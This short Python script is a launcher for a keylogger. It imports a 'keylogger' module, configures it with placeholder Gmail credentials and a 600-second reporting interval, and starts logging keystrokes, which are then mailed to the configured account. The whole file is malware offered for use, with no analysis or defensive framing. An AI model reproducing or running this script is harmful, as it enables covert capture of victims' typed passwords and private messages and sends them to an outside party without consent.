#!/usr/bin/env python
import keylogger
#set below parameters
simple_keylogger = keylogger.Keylogger(600, "yourgmailaccount@gmail.com", "password to that account")
#600 is the number of seconds between each report is sent to the specified email account
simple_keylogger.start()
